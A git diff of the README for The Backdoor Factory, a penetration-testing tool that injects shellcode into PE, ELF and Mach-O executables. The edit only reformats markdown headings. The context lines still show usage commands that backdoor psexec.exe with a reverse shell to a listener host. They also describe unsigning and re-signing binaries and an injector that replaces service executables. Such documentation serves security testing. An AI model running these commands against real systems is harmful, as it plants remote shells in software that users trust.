@@ -62,10 +62,10 @@ docker run -it secretsquirrel/the-backdoor-factory bash
 # ./backdoor.py
 ```
 
-###OLD SCHOOL
+### OLD SCHOOL
 
-####Dependences
-#####*To use OnionDuke you MUST be on an intel machine because aPLib has no support for the ARM chipset yet.*
+#### Dependences
+##### *To use OnionDuke you MUST be on an intel machine because aPLib has no support for the ARM chipset yet.*
 
 
 [Capstone engine](http://www.capstone-engine.org) can be installed from PyPi with:
@@ -129,9 +129,9 @@ Recently tested on many binaries.
     
 ---
 
-##Features:
+## Features:
 
-###PE Files
+### PE Files
 
     Can find all codecaves in an EXE/DLL.
     By default, clears the pointer to the PE certificate table, thereby unsigning a binary.
@@ -147,14 +147,14 @@ Recently tested on many binaries.
     AutoPatching (-m automtic)
     Onionduke (-m onionduke)
 
-###ELF Files
+### ELF Files
 
     Extends 1000 bytes (in bytes) to the TEXT SEGMENT and injects shellcode into that section of code.
 
-###Mach-O Files
+### Mach-O Files
     Pre-Text Section patching and signature removal
 
-###Overall
+### Overall
     
     The user can :
       -Provide custom shellcode.
@@ -167,7 +167,7 @@ Recently tested on many binaries.
 Sample Usage:
 ---
 
-###Patch an exe/dll using an existing code cave:
+### Patch an exe/dll using an existing code cave:
 
     ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 
 
@@ -208,7 +208,7 @@ Sample Usage:
 
 ---
 
-###Patch an exe/dll by adding a code section:
+### Patch an exe/dll by adding a code section:
 
     ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a 
     [*] In the backdoor module
@@ -227,19 +227,19 @@ Sample Usage:
 
 ---
 
-###Patch a directory of exes:
+### Patch a directory of exes:
     ./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a
     ...output too long for README...
 
 ---
 
-###User supplied shellcode:
+### User supplied shellcode:
     msfpayload windows/exec CMD='calc.exe' R > calc.bin
     ./backdoor.py -f psexec.exe -s user_supplied_shellcode -U calc.bin
     This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.
 
 ---
-###PEcodeSigning
+### PEcodeSigning
 
 BDF can sign PE files if you have a codesigning cert. It uses osslsigncode.
 Put your signing cert and private key in the certs/ directory.  Prep your certs using openssl commands from this blog post:
@@ -273,7 +273,7 @@ On successful run you should see this line in BDF output:
 
 
 ---
-###Hunt and backdoor: Injector | Windows Only
+### Hunt and backdoor: Injector | Windows Only
     The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
     Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.
 
@@ -281,18 +281,18 @@ On successful run you should see this line in BDF output:
 
 ---
 
-###Changelog
+### Changelog
 
-####01/11/2016
+#### 01/11/2016
 
 * Fix entry point truncation bug that led to improper recovery in rare instances
 
 
-####07/04/2016
+#### 07/04/2016
 
 * Support for dynamic paths in BDFProxy for preprocessor
 
-####06/19/2016
+#### 06/19/2016
 
 * Added the preprocessor and other optimizations
 * The preprocessor allows the user to modify the binary prior to payload injection
@@ -300,39 +300,39 @@ On successful run you should see this line in BDF output:
 * See samples in ./preprocessor/
 
 
-####12/20/2015
+#### 12/20/2015
 
  * Added directory paths to BDF to find certs directory.
 
 
-####12/18/2015
+#### 12/18/2015
  * Added PE codesiging support.  You must provide your own codesigning cert. See here: https://github.com/secretsquirrel/the-backdoor-factory#pecodesigning
 
-####11/17/2015
+#### 11/17/2015
 
  * Bug fix in rsrc section for onionduke patching and remove of random win32 version value in PE Header
 
-####11/13/2015
+#### 11/13/2015
   * Added proper truncating of a PE file after signature pointer is cleared in PE header - e.g. proper unsigning.  Resulting in better support for IAT patching
 
-####10/19/2015
+#### 10/19/2015
   * Fixed bug in IAT directory cave assignment that caused BDF crash
   * Made the feature optional with -A flag
 
-####10/13/2015
+#### 10/13/2015
    * Changed the Import Table Directory modifications from adding a new section to using an existing code cave
 
 
-####08/12/2015
+#### 08/12/2015
    * Added 'replace' PATCH_METHOD - a straight PE copy pasta of the supplied binary
    * More for usage with BDFProxy
 
         Usage: ./backdoor.py -f weee.exe -m replace -b supplied_binary.exe
 
-####08/11/2015
+#### 08/11/2015
    * Stability fix for auto cave selection for rare caves of overlap
 
-####08/05/2015
+#### 08/05/2015
     
    * BH USA UPDATES, w00t!
    * OnionDuke, use -m onionduke
@@ -347,15 +347,15 @@ On successful run you should see this line in BDF output:
     * Faster code cave finding while using *automatic* mode (-m automatic)
     * Faster rsrc parsing to find manifest file 
 
-####5/01/2015
+#### 5/01/2015
 
    * Bug fix to the reverse_tcp_stager_threaded payload when using single caves payload
 
-####4/28/2015
+#### 4/28/2015
 
    * Adding check for Bound Imports (PE files with bound imports will not be patched)
 
-####4/14/2015
+#### 4/14/2015
 
 So many updates:
   * Automatic patching for PE files (use -m automatic with a *_threaded payload)
@@ -364,7 +364,7 @@ So many updates:
 
   * Just watch: https://www.youtube.com/watch?v=kkLI_ur6BxY
 
-####2/14/2015
+#### 2/14/2015
 I <3 you guys
 
 * Added Import Address Table patching for PEs to support iat_reverse_tcp payloads that 
@@ -376,7 +376,7 @@ new Import Table in a new section. Supports x64/x86 PEs.
 
 * Bug fixes and improvements
 
-####1/1/2015
+#### 1/1/2015
 
 Happy New Year!
 
@@ -390,7 +390,7 @@ breaks BDF.
 Fixes to support cython capstone implementation null byte truncation issue
 
 
-####12/27/2014
+#### 12/27/2014
 
 Added payloadtests.py
 
@@ -402,7 +402,7 @@ by one.
     Usage: payloadtest.py binary HOST PORT
   
 
-####12/17/2014
+#### 12/17/2014
 
 OS X Beaconing Payloads for x86 and x64: beaconing_reverse_shell_tcp 
 
@@ -412,13 +412,13 @@ Bug fix to support OS X for BDFProxy
 
 
 
-####10/11/2014
+#### 10/11/2014
 
 PE UPX Patching Added
 
 
 
-####9/26/2014
+#### 9/26/2014
 
 Mach-O x86/x64 added
 
@@ -426,13 +426,13 @@ x86 IAT payload optimization
 
 
 
-####7/31/2014 
+#### 7/31/2014 
 
 Added support for ARM x32 LE ELF patching
 
 
 
-####7/22/2014 
+#### 7/22/2014 
 
 Added FreeBSD x32 ELF patching support
 
@@ -440,7 +440,7 @@ Change to BSD 3 Clause License
 
 
 
-####7/13/2014 
+#### 7/13/2014 
 
 Incorporated Capstone: http://www.capstone-engine.org/
 
@@ -452,7 +452,7 @@ Small optimizations for speed.
 
 
 
-####5/30/2014 
+#### 5/30/2014 
 
 Added a new win86 shellcode: loadliba_reverse_tcp
     
